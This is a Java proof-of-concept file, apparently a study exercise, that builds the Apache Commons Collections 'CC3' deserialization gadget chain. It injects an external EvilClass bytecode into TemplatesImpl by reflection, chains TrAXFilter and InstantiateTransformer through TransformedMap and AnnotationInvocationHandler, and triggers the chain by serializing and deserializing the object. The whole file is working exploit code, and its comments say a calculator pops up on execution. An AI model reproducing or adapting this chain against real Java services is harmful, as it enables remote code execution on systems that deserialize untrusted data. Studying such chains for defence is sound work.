package org.example;

import com.sun.org.apache.xalan.internal.xsltc.compiler.Template;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.TransformedMap;
import org.omg.PortableInterceptor.INACTIVE;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

public class CC3 {
    // 反射工具方法
    private static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
    public static void main(String[] args) throws Exception {
        //构造templates对象
        TemplatesImpl templates = new TemplatesImpl();
        Class<? extends TemplatesImpl> aClass = templates.getClass();
        //读取 EvilClass.class 文件
        byte[] evilBytes = Files.readAllBytes(Paths.get( System.getProperty("user.dir")+"\\commons-collections\\CommonsCollections2/src/main/java/EvilClass.class"));
        // 反射设置字段
        setFieldValue(templates, "_name", "EvilClass");
        setFieldValue(templates, "_bytecodes", new byte[][] {evilBytes});
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());

        //构造TraXFilter对象,执行到这个时候就会弹出计算器
//        TrAXFilter trAXFilter = new TrAXFilter(templates);

        //构造InstantiateTransformer对象
//        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});
//        instantiateTransformer.transform(TrAXFilter.class);
        //构造利用链
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates}),
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        // 使用 Target 注解并设置键为 "value"
        Map<Object, Object> innerMap = new HashMap<>();
        innerMap.put("value", "value");  // 键名必须匹配注解成员名
        Map transformedMap = TransformedMap.decorate(innerMap, null, chainedTransformer);

        //构造入口类
        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor declaredConstructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        declaredConstructor.setAccessible(true);
        Object o = declaredConstructor.newInstance(Target.class, transformedMap);

        //进行序列化
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(o);


        //进行反序列化
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray());
        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
        objectInputStream.readObject();
    }
}
